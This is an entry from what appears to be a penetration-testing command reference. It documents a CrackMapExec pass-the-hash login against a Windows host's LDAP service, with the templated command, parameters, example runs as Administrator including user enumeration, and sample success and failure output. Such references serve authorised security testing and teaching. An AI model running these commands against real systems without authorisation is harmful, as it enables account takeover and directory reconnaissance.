---
id: e0675504-e68e-46bd-9073-51cf1773cf5b
type: command
executor: bash
data: 'crackmapexec ldap $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"'
output: null
created_at: '2023-04-06T03:56:30.721521+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - ldap
verified: true
validated: true
---

# crackmapexec-ldap-with-nt-hash

## Command

```bash
crackmapexec ldap $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

## Description

This command tests a username and NT hash against the LDAP service on a target Windows host, commonly used for directory enumeration in Active Directory environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | IP address or hostname of the target | Yes |
| -u $_USERNAME | Username to test | Yes |
| -H ":$_NT_HASH" | NT hash prefixed with colon (e.g., :31d6cfe0d16ae931b73c59d7e0c089c0) | Yes |
| ldap | Protocol specifier for LDAP (port 389/636) | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

### With Additional Enumeration

```bash
crackmapexec ldap 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0" --users
```

## Expected Output

Successful authentication:

LDAP                 192.168.1.100:389    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0:Pwn3d! [+] Windows Server 2019 Standard 17763 (name:DC01) (domain:corp.local)

Failed:

LDAP                 192.168.1.100:389    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [-] CORP\administrator STATUS: LOGON_FAILURE

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
- [[commands/crackmapexec-smb-with-nt-hash]]
